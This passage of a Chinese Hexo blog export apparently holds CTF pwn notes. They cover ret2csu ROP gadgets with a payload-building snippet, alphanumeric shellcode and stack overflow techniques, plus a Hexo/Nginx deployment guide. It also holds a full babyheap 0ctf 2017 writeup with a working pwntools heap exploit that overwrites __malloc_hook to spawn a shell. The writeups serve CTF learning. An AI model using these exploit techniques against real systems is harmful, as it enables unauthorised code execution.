+<h4 id="ret2syscall"><a href="#ret2syscall" class="headerlink" title="ret2syscall"></a>ret2syscall</h4><p>类似于ret2libc，不同是控制程序执行系统调用函数来get shell或泄露敏感文件内容，常需要构造rop chain或写入shellcode来使用。系统调用不了解可以看看这篇<a href="http://110.42.161.158/2022/03/04/%E7%B3%BB%E7%BB%9F%E8%B0%83%E7%94%A8%E4%BB%8B%E7%BB%8D/">文章</a>。</p>
+<h3 id="中级ROP"><a href="#中级ROP" class="headerlink" title="中级ROP"></a>中级ROP</h3><h4 id="ret2csu"><a href="#ret2csu" class="headerlink" title="ret2csu"></a>ret2csu</h4><p>主要攻击方式以基本ROP为主，ret2csu的作用体现在对寄存器赋值上，个人觉得和高级ROP中的SROP功能差不多。原理是基于<code>__libc_csu_init</code> 中的 gadgets：</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">……</span><br><span class="line">.text:0000000000400600 loc_400600:                             ; CODE XREF: __libc_csu_init+54j</span><br><span class="line">.text:0000000000400600                 mov     rdx, r13</span><br><span class="line">.text:0000000000400603                 mov     rsi, r14</span><br><span class="line">.text:0000000000400606                 mov     edi, r15d</span><br><span class="line">.text:0000000000400609                 call    qword ptr [r12+rbx*8]</span><br><span class="line">.text:000000000040060D                 add     rbx, 1</span><br><span class="line">.text:0000000000400611                 cmp     rbx, rbp</span><br><span class="line">.text:0000000000400614                 jnz     short loc_400600</span><br><span class="line">.text:0000000000400616</span><br><span class="line">.text:0000000000400616 loc_400616:                             ; CODE XREF: __libc_csu_init+34j</span><br><span class="line">.text:0000000000400616                 add     rsp, 8</span><br><span class="line">.text:000000000040061A                 pop     rbx</span><br><span class="line">.text:000000000040061B                 pop     rbp</span><br><span class="line">.text:000000000040061C                 pop     r12</span><br><span class="line">.text:000000000040061E                 pop     r13</span><br><span class="line">.text:0000000000400620                 pop     r14</span><br><span class="line">.text:0000000000400622                 pop     r15</span><br><span class="line">.text:0000000000400624                 retn</span><br><span class="line">……</span><br></pre></td></tr></table></figure>
+
+<p>这两段能完成对<code>rdx</code>,<code>rsi</code>,<code>edi</code>的赋值，其实主要是对<code>rdx</code>，一般有直接对寄存器<code>rsi</code>,<code>rdi</code>赋值的gadget，而对于<code>rdx</code>则无。</p>
+<p>需要注意的是寄存器<code>r12</code>,<code>r13</code>的内容，由于在gadget中有指令<code>cmp rbx,rbp;jnz short loc_xxxxxx</code>与<code>call qword ptr [r12+rbx*8]</code>，意思是程序将对<code>rbx，rbp</code>的内容进行比较，不同则跳转会首部再执行一次；从<code>r12+rbx*8</code>地址保存的指令开始执行。一般我们将r13置为0，则会通过cmp检测。而r12的值可以当作一次rip来进行写入。或者可以使用<code>_fini</code>中的指令，这一块的指令对于我们的操作是无害的，内容为：<code>sub rsp,8;add rsp,8</code>，<code>_fini</code>的地址存放在<strong>dynamic</strong>部分。</p>
+<p>这里我放上自己的ret2csu.sublime-snippet，方便做题使用。</p>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">&lt;snippet&gt;</span><br><span class="line">	&lt;content&gt;&lt;![CDATA[</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">ret2csu</span>(<span class="params">r12,r13,r14,r15,system=<span class="number">0</span></span>):</span></span><br><span class="line">    rbx=<span class="number">0</span></span><br><span class="line">    rbp=<span class="number">1</span></span><br><span class="line">    pop=$&#123;<span class="number">1</span>:pop&#125;</span><br><span class="line">    mov=$&#123;<span class="number">2</span>:mov&#125;</span><br><span class="line">    payload=<span class="string">&#x27;&#x27;</span></span><br><span class="line">    <span class="keyword">if</span> system:</span><br><span class="line">        payload+=p32(pop)+p32(rbx)+p32(rbp)+p32(r12)+p32(r13)+p32(r14)+p32(r15)+p32(mov)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        payload+=p64(pop)+p64(rbx)+p64(rbp)+p64(r12)+p64(r13)+p64(r14)+p64(r15)+p64(mov)</span><br><span class="line">  	<span class="keyword">return</span> payload</span><br><span class="line"></span><br><span class="line">payload+=ret2csu($&#123;<span class="number">3</span>:system&#125;,$&#123;<span class="number">4</span>:rip&#125;,$&#123;<span class="number">5</span>:edi&#125;,$&#123;<span class="number">6</span>:rsi&#125;,$&#123;<span class="number">7</span>:rdx&#125;)</span><br><span class="line">]]&gt;&lt;/content&gt;</span><br><span class="line">	&lt;!-- <span class="type">Optional</span>: <span class="type">Set</span> a tabTrigger to define how to trigger the snippet --&gt;</span><br><span class="line">	&lt;tabTrigger&gt;ret2csu&lt;/tabTrigger&gt;</span><br><span class="line">	&lt;!-- <span class="type">Optional</span>: <span class="type">Set</span> a scope to limit where the snippet will trigger --&gt;</span><br><span class="line">	&lt;!-- &lt;scope&gt;source.python&lt;/scope&gt; --&gt;</span><br><span class="line">&lt;/snippet&gt;</span><br></pre></td></tr></table></figure>
+
+<p>默认打包使用64位模式下的内存块大小，其中的pop指的是第二段gadget中的从<code>pop rbx</code>的地址，mov为第一段gadget的<code>mov rdx,r13</code>地址。</p>
+]]></content>
+      <tags>
+        <tag>CTF</tag>
+        <tag>笔记</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>Ubuntu使用Nginx+Hexo博客</title>
+    <url>/2021/12/25/Ubuntu%E4%BD%BF%E7%94%A8Nginx-Hexo%E5%8D%9A%E5%AE%A2/</url>
+    <content><![CDATA[<p>基于hexo官方文档 <a href="https://hexo.io/zh-cn/docs/">https://hexo.io/zh-cn/docs/</a> 和网上其他博主的搭建过程，照葫芦画瓢好不容易搭好了博客，回忆了一下自己的大概操作。</p>
+<span id="more"></span>
+
+<h1 id="本地配置"><a href="#本地配置" class="headerlink" title="本地配置"></a>本地配置</h1><p>我本地使用的也是ubuntu，以下就以ubuntu为例了</p>
+<h2 id="安装必要程序"><a href="#安装必要程序" class="headerlink" title="安装必要程序"></a>安装必要程序</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">sudo apt install git</span><br><span class="line">sudo apt install node.js</span><br><span class="line">npm install -g hexo-cli</span><br></pre></td></tr></table></figure>
+
+<p>如果无法直接安装hexo可以更换npm源，以下是淘宝的</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">npm config set registry https://registry.npm.taobao.org</span><br></pre></td></tr></table></figure>
+
+<h2 id="配置hexo"><a href="#配置hexo" class="headerlink" title="配置hexo"></a>配置hexo</h2><p>在任意路径下创建一个文件夹，然后进行操作</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">hexo init &lt;folder&gt;</span><br><span class="line">cd &lt;folder&gt;</span><br><span class="line">npm install</span><br><span class="line">npm install hexo-deployer-git --save</span><br></pre></td></tr></table></figure>
+
+<p>然后运行一次hexo</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">hexo server</span><br></pre></td></tr></table></figure>
+
+<p>然后在本地浏览器上，访问127.0.0.1:4000。如果hexo配置成功，则会出现hexo的默认页面。</p>
+<p><img src="https://s2.loli.net/2021/12/25/MXljT2zv5BIY4wG.png" alt="default.png"></p>
+<p>Ctrl+C结束后，继续进行配置。</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">cd &lt;folder&gt;</span><br><span class="line">sudo _config.yml</span><br></pre></td></tr></table></figure>
+
+<p>在配置文件中配置deploy用于一键部署，在文件最后</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">deploy:</span><br><span class="line">  type: git</span><br><span class="line">  repo: git@&#x27;服务器ip&#x27;:&#x27;远程仓库路径&#x27;  # 远程仓库的创建在下文</span><br><span class="line">  branch: master</span><br></pre></td></tr></table></figure>
+
+<h1 id="服务器配置"><a href="#服务器配置" class="headerlink" title="服务器配置"></a>服务器配置</h1><h2 id="安装nginx"><a href="#安装nginx" class="headerlink" title="安装nginx"></a>安装nginx</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">sudo apt install nginx</span><br></pre></td></tr></table></figure>
+
+<p>启动nginx</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">service nginx start</span><br></pre></td></tr></table></figure>
+
+<p>登陆服务器访问服务器，出现nginx测试页面则代表成功</p>
+<h2 id="创建git用户"><a href="#创建git用户" class="headerlink" title="创建git用户"></a>创建git用户</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">adduser git</span><br></pre></td></tr></table></figure>
+
+<h2 id="创建远程仓库"><a href="#创建远程仓库" class="headerlink" title="创建远程仓库"></a>创建远程仓库</h2> <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">sudo mkdir /var/repo</span><br><span class="line">cd /var/repo</span><br><span class="line">sudo mkdir blog.git</span><br><span class="line">sudo chown -R git:git blog.git</span><br><span class="line">cd blog.git</span><br><span class="line">git init --bare</span><br></pre></td></tr></table></figure>
+
+<h2 id="创建静态文件夹"><a href="#创建静态文件夹" class="headerlink" title="创建静态文件夹"></a>创建静态文件夹</h2><p>用来存放本地hexo文件夹中的public文件夹文件</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">sudo mkdir /var/www/blog</span><br><span class="line">sudo chown -R git:git /var/www/blog</span><br></pre></td></tr></table></figure>
+
+<h2 id="将本地机器上的ssh公钥填入authorized-keys文件"><a href="#将本地机器上的ssh公钥填入authorized-keys文件" class="headerlink" title="将本地机器上的ssh公钥填入authorized_keys文件"></a>将本地机器上的ssh公钥填入authorized_keys文件</h2><p>因为git是新用户，所以需要先生成自己的ssh公钥</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">su git</span><br><span class="line">ssh-keygen -t rsa</span><br><span class="line">su root</span><br></pre></td></tr></table></figure>
+
+<p>一直回车即可，然后在本地机器上查看ssh公钥</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">cat ~/.ssh/id_rsa.pub</span><br></pre></td></tr></table></figure>
+
+<p>复制后粘贴在服务器指定文件中</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">sudo vim /home/git/.ssh/authorized_keys</span><br></pre></td></tr></table></figure>
+
+<h2 id="配置git-hook"><a href="#配置git-hook" class="headerlink" title="配置git hook"></a>配置git hook</h2><p>进入远程仓库进行操作</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">cd hooks</span><br><span class="line">sudo vim post-receive</span><br></pre></td></tr></table></figure>
+
+<p>填入</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">#!/bin/bash</span><br><span class="line">  </span><br><span class="line">git --work-tree=/var/www/blog --git-dir=/var/repo/blog.git checkout -f</span><br><span class="line">#               &lt;静态文件地址&gt;        &lt;远程仓库地址&gt;</span><br></pre></td></tr></table></figure>
+
+<p>最后赋予文件可执行权限</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">chmod +x post-receive</span><br></pre></td></tr></table></figure>
+
+<p>然后就可实现自动部署</p>
+<p>最后，在本地打开hexo文件夹进行操作</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">hexo clean</span><br><span class="line">hexo g</span><br><span class="line">hexo d</span><br></pre></td></tr></table></figure>
+
+<p>然后浏览器访问远程服务器，如果出现hexo默认页面则代表成功。至此，搭建博客结束。</p>
+]]></content>
+      <tags>
+        <tag>hexo</tag>
+        <tag>随笔</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>alphanumeric_shellcode</title>
+    <url>/2022/02/08/alphanumeric-shellcode/</url>
+    <content><![CDATA[<p>刷buu时做到一题限制了字符范围的题(mrctf2020_shellcode_revenge)。</p>
+<span id="more"></span>
+
+<p>需要使用alphanumeric shellcode(纯字符shellcode)。</p>
+<p>就是使用纯字符对应的汇编指令完成shellcode的编写，比如：</p>
+<table>
+<thead>
+<tr>
+<th align="center">ASCII字符</th>
+<th align="center">Hex</th>
+<th align="center">汇编指令</th>
+</tr>
+</thead>
+<tbody><tr>
+<td align="center">P</td>
+<td align="center">0x50</td>
+<td align="center">push %rax</td>
+</tr>
+<tr>
+<td align="center">Q</td>
+<td align="center">0x51</td>
+<td align="center">push %rcx</td>
+</tr>
+<tr>
+<td align="center">R</td>
+<td align="center">0x52</td>
+<td align="center">push %rdx</td>
+</tr>
+<tr>
+<td align="center">S</td>
+<td align="center">0x53</td>
+<td align="center">push %rbx</td>
+</tr>
+<tr>
+<td align="center">T</td>
+<td align="center">0x54</td>
+<td align="center">push %rsp</td>
+</tr>
+<tr>
+<td align="center">U</td>
+<td align="center">0x55</td>
+<td align="center">push %rbp</td>
+</tr>
+<tr>
+<td align="center">V</td>
+<td align="center">0x56</td>
+<td align="center">push %rsi</td>
+</tr>
+<tr>
+<td align="center">W</td>
+<td align="center">0x57</td>
+<td align="center">push %rdi</td>
+</tr>
+<tr>
+<td align="center">X</td>
+<td align="center">0x58</td>
+<td align="center">pop %rax</td>
+</tr>
+<tr>
+<td align="center">Y</td>
+<td align="center">0x59</td>
+<td align="center">pop %rcx</td>
+</tr>
+<tr>
+<td align="center">Z</td>
+<td align="center">0x5a</td>
+<td align="center">pop %rdx</td>
+</tr>
+</tbody></table>
+<p>我们可以使用一些工具来进行编码。</p>
+<p>详情如下：<a href="http://taqini.space/2020/03/31/alpha-shellcode-gen/#alphanumeric-shellcode">http://taqini.space/2020/03/31/alpha-shellcode-gen/#alphanumeric-shellcode</a></p>
+]]></content>
+      <tags>
+        <tag>CTF</tag>
+        <tag>pwn</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>babyheap-0ctf-2017-writeup</title>
+    <url>/2022/03/02/babyheap-0ctf-2017-writeup/</url>
+    <content><![CDATA[<p>第一次解出堆题，我很开心，虽然不是独立解出的，但我还是很开心。</p>
+<span id="more"></span>
+<p>分析程序的几个功能，allocate可以申请堆空间；free可以释放堆空间；fill可以向堆空间中写入；dump可以将堆空间的内容打印出来。</p>
+<p>解题思路：先利用fastbin attach，修改单链表中的地址，使一个堆地址拥有两个序号使其释放后能够继续执行dump，从而泄露出main_arena的地址，再通过它泄露libc。同样的操作，将我们需要修改的libc地址伪造成chunk，再对其进行改写，这里我们选择将__malloc_hook写为one_gadget。</p>
+<h2 id="泄漏libc"><a href="#泄漏libc" class="headerlink" title="泄漏libc"></a>泄漏libc</h2><p>我们首先申请几个fastchunk，并且释放两个，将其指针放入fastbin中，然后利用堆溢出漏洞，使第二个fastbin中的fd改写成smallchunk。</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">fastbins</span><br><span class="line">0x20: 0x55c9e24f5040 —▸ 0x55c9e24f5020 ◂— 0x0</span><br><span class="line">					↓</span><br><span class="line">fastbins</span><br><span class="line">0x20: 0x55c9e24f5040 —▸ 0x55c9e24f5080 ◂— 0x0</span><br></pre></td></tr></table></figure>
+
+<p>但是此时系统还不会认定这个smallchunk为fastchunk，我们需要改变smallchunk的chunksize来通过malloc的安全检测，即chunksize是否与fastbin序号对应。</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">ocated chunk | PREV_INUSE</span><br><span class="line">Addr: 0x55c9e24f5080</span><br><span class="line">Size: 0x91</span><br><span class="line">			↓</span><br><span class="line">Free chunk (fastbins) | PREV_INUSE</span><br><span class="line">Addr: 0x55c9e24f5080</span><br><span class="line">Size: 0x21</span><br><span class="line">fd: 0x00</span><br><span class="line"></span><br><span class="line">Allocated chunk</span><br><span class="line">Addr: 0x55c9e24f50a0</span><br><span class="line">Size: 0x00</span><br></pre></td></tr></table></figure>
+
+<p>连续申请两次后，fastbin被申请空了。而我们原本的smallchunk现在被两个index绑定，分别是2和4。</p>
+<p>我们再将之前申请的smallchunk的chunksize恢复为0x91。</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Allocated chunk | PREV_INUSE</span><br><span class="line">Addr: 0x55c9e24f5080</span><br><span class="line">Size: 0x21</span><br><span class="line">			↓</span><br><span class="line">Allocated chunk | PREV_INUSE</span><br><span class="line">Addr: 0x55c9e24f5080</span><br><span class="line">Size: 0x91</span><br></pre></td></tr></table></figure>
+
+<p>然后我们再申请一次，将这个smallchunk与top chunk分开，防止合并。接着释放掉2(或者4)，然后它会被放入unsortedbin中，再dump4(或者2)，即可泄露出main_arena，再通过libc文件中的malloc_trim函数，得知main_arena的偏移，然后libc就泄露完毕了。</p>
+<h2 id="修改内容"><a href="#修改内容" class="headerlink" title="修改内容"></a>修改内容</h2><p>此时这块smallchunk被放入了unsortedbin当中，并且还有个index2指向它，我们要想释放2，还需要申请一次堆，防止重复释放，并且这次会从unsortedbin中获取，再将其释放才行，然后我们会得到一个能指定内容的freechunk。</p>
+<p>利用fastbin attack，先将这块freechunk的fd写为libc中的地址，那么就能将libc地址放入fastbin中，下次从fastbin中获取时就能对libc中的内容进行更改。</p>
+<p>但mallco之前还是得注意通过安全检测。</p>
+<p>我们在__malloc_hook旁边寻找合适的地址，并没有什么比较合适的，利用偏移的方法，强行是使chunksize为一个合适的大小。这里我们使用的地址是 <code>__mallco_hook-35</code>。</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">0x7f5e1924faed &lt;_IO_wide_data_0+301&gt;:	0x5e1924e260000000	0x000000000000007f</span><br></pre></td></tr></table></figure>
+
+<p>这时候我们去申请一个差不多大小的堆时，就会成功。然后修改其内容为one_gadget，前面用35个’\0’填充即可。</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">00:0000│   0x7f5e1924fb10 (__malloc_hook) —▸ 0x7f5e18ed026a (do_system+1082) ◂— push   qword ptr [rcx]</span><br></pre></td></tr></table></figure>
+
+<p>再使用一次malloc即可getshell。</p>
+<h2 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h2><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context(log_level=<span class="string">&#x27;debug&#x27;</span>,os=<span class="string">&#x27;linux&#x27;</span>,arch=<span class="string">&#x27;amd64&#x27;</span>)</span><br><span class="line"></span><br><span class="line">io=process(<span class="string">&#x27;./babyheap_0ctf_2017&#x27;</span>)</span><br><span class="line"><span class="comment"># io=remote(&#x27;node4.buuoj.cn&#x27;,25706)</span></span><br><span class="line"></span><br><span class="line">choose=<span class="keyword">lambda</span> x:io.sendlineafter(<span class="string">&quot;Command: &quot;</span>,x)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">allocate</span>(<span class="params">x</span>):</span></span><br><span class="line">	choose(<span class="string">&#x27;1&#x27;</span>)</span><br><span class="line">	io.sendlineafter(<span class="string">&quot;Size: &quot;</span>,x)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">fill</span>(<span class="params">x,content</span>):</span></span><br><span class="line">	choose(<span class="string">&#x27;2&#x27;</span>)</span><br><span class="line">	io.sendlineafter(<span class="string">&quot;Index: &quot;</span>,x)</span><br><span class="line">	io.sendlineafter(<span class="string">&quot;Size: &quot;</span>,<span class="built_in">str</span>(<span class="built_in">len</span>(content)))</span><br><span class="line">	io.sendlineafter(<span class="string">&quot;Content: &quot;</span>,content)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">free</span>(<span class="params">x</span>):</span></span><br><span class="line">	choose(<span class="string">&#x27;3&#x27;</span>)</span><br><span class="line">	io.sendlineafter(<span class="string">&quot;Index: &quot;</span>,x)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">dump</span>(<span class="params">x</span>):</span></span><br><span class="line">	choose(<span class="string">&#x27;4&#x27;</span>)</span><br><span class="line">	io.sendlineafter(<span class="string">&quot;Index: &quot;</span>,x)</span><br><span class="line"></span><br><span class="line">allocate(<span class="built_in">str</span>(<span class="number">0x10</span>))</span><br><span class="line">allocate(<span class="built_in">str</span>(<span class="number">0x10</span>))</span><br><span class="line">allocate(<span class="built_in">str</span>(<span class="number">0x10</span>))</span><br><span class="line">allocate(<span class="built_in">str</span>(<span class="number">0x10</span>))</span><br><span class="line">allocate(<span class="built_in">str</span>(<span class="number">0x80</span>))</span><br><span class="line"></span><br><span class="line">free(<span class="string">&#x27;1&#x27;</span>)</span><br><span class="line">free(<span class="string">&#x27;2&#x27;</span>)</span><br><span class="line"></span><br><span class="line">payload=p64(<span class="number">0</span>)*<span class="number">3</span>+p64(<span class="number">0x21</span>)+p64(<span class="number">0</span>)*<span class="number">3</span>+p64(<span class="number">0x21</span>)+p8(<span class="number">0x80</span>)</span><br><span class="line">fill(<span class="string">&#x27;0&#x27;</span>,payload)</span><br><span class="line"></span><br><span class="line">payload=p64(<span class="number">0</span>)*<span class="number">3</span>+p64(<span class="number">0x21</span>)</span><br><span class="line">fill(<span class="string">&#x27;3&#x27;</span>,payload)</span><br><span class="line"></span><br><span class="line">allocate(<span class="built_in">str</span>(<span class="number">0x10</span>))</span><br><span class="line">allocate(<span class="built_in">str</span>(<span class="number">0x10</span>))</span><br><span class="line"></span><br><span class="line">payload=p64(<span class="number">0</span>)*<span class="number">3</span>+p64(<span class="number">0x91</span>)</span><br><span class="line">fill(<span class="string">&#x27;3&#x27;</span>, payload)</span><br><span class="line"></span><br><span class="line">allocate(<span class="built_in">str</span>(<span class="number">0x80</span>))</span><br><span class="line"></span><br><span class="line">free(<span class="string">&#x27;4&#x27;</span>)</span><br><span class="line"></span><br><span class="line">dump(<span class="string">&#x27;2&#x27;</span>)</span><br><span class="line"></span><br><span class="line">io.recvuntil(<span class="string">&#x27;Content: &#x27;</span>)</span><br><span class="line">main_arena=u64(io.recvuntil(<span class="string">&#x27;\x7f&#x27;</span>)[-<span class="number">6</span>:].ljust(<span class="number">8</span>,<span class="string">&#x27;\0&#x27;</span>))-<span class="number">88</span></span><br><span class="line"><span class="built_in">print</span> <span class="built_in">hex</span>(main_arena)</span><br><span class="line">libc_base=main_arena-<span class="number">0x3c4b20</span></span><br><span class="line"><span class="built_in">print</span> <span class="built_in">hex</span>(libc_base)</span><br><span class="line"></span><br><span class="line">allocate(<span class="built_in">str</span>(<span class="number">0x60</span>))</span><br><span class="line"></span><br><span class="line"><span class="comment"># io.recvuntil(&#x27;Allocate Index &#x27;)</span></span><br><span class="line"><span class="comment"># index=int(io.recv(2),10)</span></span><br><span class="line"><span class="comment"># print index</span></span><br><span class="line"></span><br><span class="line">free(<span class="string">&#x27;2&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># payload=p64(libc_base+0x3c4aed)</span></span><br><span class="line">libc=ELF(<span class="string">&#x27;./libc-2.23.so&#x27;</span>)</span><br><span class="line">__malloc_hook=libc_base+libc.sym[<span class="string">&#x27;__malloc_hook&#x27;</span>]</span><br><span class="line">payload=p64(__malloc_hook-<span class="number">35</span>)</span><br><span class="line"><span class="built_in">print</span> <span class="built_in">hex</span>(__malloc_hook)</span><br><span class="line">fill(<span class="string">&#x27;4&#x27;</span>,payload)</span><br><span class="line"></span><br><span class="line">allocate(<span class="built_in">str</span>(<span class="number">0x60</span>))</span><br><span class="line">allocate(<span class="built_in">str</span>(<span class="number">0x60</span>))</span><br><span class="line"></span><br><span class="line"><span class="comment"># io.recvuntil(&#x27;Allocate Index &#x27;)</span></span><br><span class="line"><span class="comment"># index=int(io.recv(2),10)</span></span><br><span class="line"><span class="comment"># print index</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># one_gadget=libc_base+0x4527a # local</span></span><br><span class="line">one_gadget=libc_base+<span class="number">0x4526a</span></span><br><span class="line"><span class="built_in">print</span> <span class="built_in">hex</span>(one_gadget)</span><br><span class="line"></span><br><span class="line">payload=p64(<span class="number">0</span>)*<span class="number">2</span>+<span class="string">&#x27;\0&#x27;</span>*<span class="number">3</span></span><br><span class="line">payload+=p64(one_gadget)</span><br><span class="line">fill(<span class="string">&#x27;6&#x27;</span>,payload)</span><br><span class="line"></span><br><span class="line">allocate(<span class="built_in">str</span>(<span class="number">0x10</span>))</span><br><span class="line"></span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure>
+
+]]></content>
+      <tags>
+        <tag>CTF</tag>
+        <tag>pwn</tag>
+        <tag>writeup</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>stack overflow漏洞小结</title>
+    <url>/2022/03/04/stack-overflow%E6%BC%8F%E6%B4%9E%E5%B0%8F%E7%BB%93/</url>
+    <content><![CDATA[<p>以<a href="https://ctf-wiki.org/pwn/linux/user-mode/environment/">CTF Wiki</a>的目录为骨架，记录自己对栈溢出漏洞的理解。</p>
+<span id="more"></span>
+
+<p>对于CTF的pwn方向而言，我们实际上要做的就是通过一些漏洞来达到干扰程序的运行流程，以达到get shell或泄露敏感文件的内容的效果。</p>
+<p>在介绍stack overflow漏洞之前，我们需要对栈有一个<a href="http://110.42.161.158/2022/03/04/%E6%A0%88%E4%BB%8B%E7%BB%8D/">基本的了解</a>。</p>
+<h2 id="介绍"><a href="#介绍" class="headerlink" title="介绍"></a>介绍</h2><p>栈溢出指的是用户向栈中变量写入的长度超过了其本身的长度，导致其相邻栈数据被改写的情况。发生栈溢出的前提是：</p>
+<ul>
+<li>写入的位置在栈上</li>
+<li>写入的长度没被良好的控制</li>
+</ul>
+<h2 id="相关危险函数"><a href="#相关危险函数" class="headerlink" title="相关危险函数"></a>相关危险函数</h2><p>通过上面提到的前提，我们知道要想利用栈溢出，则必须有用户输入的环节。包括的常见输入危险函数有：</p>
+<ul>
+<li> gets：从标准输入<code>stdin</code>中读取数据直到出现换行符或读到文件尾为止，最后加上NULL作为字符串结束。</li>
+<li> scanf：从标准输入 stdin 读取格式化输入。</li>
+</ul>
+<p>以上函数均没有较好的限制长度，所以容易产生溢出漏洞。</p>
+<p>除了输入环节，还有一些涉及到字符串赋值的环节也会产生栈溢出漏洞，包括的常见函数有：</p>
+<ul>
+<li> strcpy，字符串复制，遇到’\x00’停止</li>
+<li> strcat，字符串拼接，遇到’\x00’停止</li>
+</ul>
+<p>遇到上面两个函数时，也会因为被赋值变量的长度不够而导致溢出。</p>
+<h2 id="利用漏洞"><a href="#利用漏洞" class="headerlink" title="利用漏洞"></a>利用漏洞</h2><p>当我们找到此漏洞时，我们就可以任意改写此变量之后的任意地址中的内容。常见的利用此漏洞进行改写的地址有：</p>
+<ul>
+<li><code>return addrss</code>中的内容</li>
+<li>栈上其他变量的值</li>
+<li>若待写变量在bss段，也能更改bss段中的内容</li>
+</ul>
+<p>我们想要改写地址的目的无非是<strong>直接或者间接地控制程序执行流程</strong>。</p>
+<p>而利用栈溢出漏洞最常见的攻击方式，就是ROP了，了解可以看看这篇<a href="http://110.42.161.158/2022/03/04/ROP%E4%BB%8B%E7%BB%8D/">ROP介绍</a>。</p>
+<h2 id="栈溢出技巧"><a href="#栈溢出技巧" class="headerlink" title="栈溢出技巧"></a>栈溢出技巧</h2><p>由于本人水平有限，仅简单介绍CTF Wiki上的花式栈溢出技巧。</p>
+<h3 id="stack-pivot"><a href="#stack-pivot" class="headerlink" title="stack pivot"></a>stack pivot</h3><p>合理使用<code>jmp esp</code>或<code>pop esp</code>指令将栈顶指针跳转到指定的地址，执行<code>ret</code>指令后将从该位置执行。我们常将构造的rop chain或shellcode写入一些可写入地址，然后将栈顶迁移到这些地址或后门函数，并在此处开栈执行设计好的流程。</p>
+<h3 id="frame-faking"><a href="#frame-faking" class="headerlink" title="frame faking"></a>frame faking</h3><p>构造一个虚假的栈帧来控制程序的执行流</p>
+<p>我感觉其实就是栈迁移，只不过当我们没有合适的指令改变栈顶指针时，通过<code>leave;ret</code>指令的重复使用，将栈帧迁移到我们指定的地址，然后将<code>rip</code>寄存器赋值为我们构造的rop chain。</p>
+<p>先在合适的地方将我们构造的rop chain或shellcode，再利用栈溢出将<strong>指令的首地址+8</strong>的指针写入栈帧部分，再将<code>leave;ret</code>指令的地址写入return address。那么加上原本程序中的<code>leave;ret</code>，我们将执行两次。执行了两次后将栈顶搬到了指定地址，最后的<code>ret</code>指令就会将写入的指令写入<code>rip</code>寄存器，接着执行你设计的执行流。</p>
+<p>根据下图加深印象：</p>
+<p><img src="https://s2.loli.net/2022/03/04/FftxCI8Ey3KrHpb.png" alt="5"></p>
+<p>需要注意的是，当我们将栈帧迁移之后，我们写入的执行指令可能是执行另一个函数，那么就会在当前这个位置开栈。如果我们开栈的位置距离一些写有重要数据的段不远，那么函数执行时将会覆盖掉一些，可能会令程序执行不下去导致dump。</p>
+<h3 id="stack-smash"><a href="#stack-smash" class="headerlink" title="stack smash"></a>stack smash</h3><p>我们知道如果程序开启了canary保护后，我们进行栈溢出操作就会报错。stack smash就是利用改写报错内容来打印出敏感内容。</p>
+<p>原理：开启了canary保护后，若发现canary被修改，程序就会执行<code>__stack_chk_fail</code>函数来打印argv[0]指针所指向的字符串，正常情况下，这个指针指向的是程序名。所以当我们利用栈溢出漏洞将argv[0]地址的内容改写为敏感信息的地址，那么就能泄露。</p>
+<h3 id="栈上的-partial-overwrite"><a href="#栈上的-partial-overwrite" class="headerlink" title="栈上的 partial overwrite"></a>栈上的 partial overwrite</h3><p>内容主要是：仅改变这个地址的部分内容，一般为低位。</p>
+<p>程序即使开了地址随机化保护，它的主要表现都集中在高位地址的变化，而低12位地址一般是偏移，是不会变化的，这也是我们利用低12位地址就能泄露libc版本原因。因此，我们仅需改写地址的低12位地址的偏移就能绕过PIE保护。</p>
+]]></content>
+      <tags>
+        <tag>CTF</tag>
+        <tag>笔记</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>wustctf2020-babyfmt-writeup</title>
+    <url>/2022/03/03/wustctf2020-babyfmt-writeup/</url>
+    <content><![CDATA[<p>函数就不放了</p>
+<span id="more"></span>
+
+<p>除了利用字符串格式化漏洞的操作外，还要了解FILE结构。</p>
